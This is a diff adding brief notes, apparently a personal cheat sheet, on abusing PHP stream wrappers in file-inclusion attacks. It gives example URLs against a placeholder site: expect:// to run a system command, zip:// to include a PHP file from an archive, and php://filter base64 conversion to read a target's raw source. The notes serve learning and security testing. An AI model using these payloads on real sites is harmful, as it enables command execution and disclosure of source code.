@@ -1,0 +1,15 @@
+expect://
+- Execute system command
+www.vuln.com/index.php?page=expect://ls
+
+zip://
+- Unzip Item and find item inside
+www.vuln.com/index.php?page=zip://file.zip#inside.php
+
+php://filter
+- Filter, but usually used for converting
+- Can get php file without executing(Get raw code)
+www.vuln.com/index.php?page=php://filter/convert.base64-encode/resource=target.php
+Ref: https://www.php.net/manual/en/filters.php
+
+or Rot13 Encoding, etc.
